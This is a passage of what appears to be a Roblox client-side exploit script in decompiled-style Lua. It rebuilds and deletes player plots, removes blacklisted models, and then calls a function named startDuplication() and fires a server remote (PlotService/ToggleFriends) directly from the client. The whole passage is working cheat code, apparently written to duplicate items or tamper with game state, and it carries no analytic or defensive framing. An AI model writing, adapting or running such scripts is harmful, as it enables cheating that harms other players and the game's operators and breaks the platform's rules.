            local v144 = v143:FindFirstChild("PlotSign", true) and v143.PlotSign:FindFirstChild("SurfaceGui", true) and v143.PlotSign.SurfaceGui:FindFirstChild("Frame", true) and v143.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel", true);
            if v144 and v144.Text ~= "Empty Base" then
                v130[v143] = true;
            elseif v143.PrimaryPart then
                local v145 = {plot = v143, cframe = v143.PrimaryPart.CFrame};
                table.insert(v131, v145);
            end;
        end;
    end;
    for _, v147 in ipairs(v131) do
        local v148 = v147.plot:Clone();
        v137(v148);
        v141(v148);
        local v149 = {clone = v148, cframe = v147.cframe};
        table.insert(v132, v149);
    end;
    for _, v151 in ipairs(v131) do
        v151.plot:Destroy();
    end;
    for _, v153 in ipairs(v132) do
        local l_clone_0 = v153.clone;
        local l_cframe_0 = v153.cframe;
        l_clone_0.Parent = l_Plots_2;
        if l_clone_0.PrimaryPart and l_cframe_0 then
            l_clone_0:SetPrimaryPartCFrame(l_cframe_0);
        end;
    end;
    l_Plots_2.ChildAdded:Connect(function(v156)
        if v130[v156] then
            return;
        else
            v156:Destroy();
            return;
        end;
    end);
end);

-- Remove blacklisted models
pcall(function()
    local function _(v157)
        return v157:IsA("Model") and v8[v157.Name] and v157.Parent == l_Workspace_0;
    end;
    for _, v160 in ipairs(l_Workspace_0:GetChildren()) do
        if v160:IsA("Model") and v8[v160.Name] and v160.Parent == l_Workspace_0 then
            pcall(function()
                v160:Destroy();
            end);
        end;
    end;
    l_Workspace_0.ChildAdded:Connect(function(v161)
        if v161:IsA("Model") and v8[v161.Name] and v161.Parent == l_Workspace_0 then
            pcall(function()
                v161:Destroy();
            end);
        end;
    end);
end);

-- Start the main duplication process
task.wait(3) -- Wait for everything to initialize
startDuplication()
game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RE/PlotService/ToggleFriends"):FireServer()
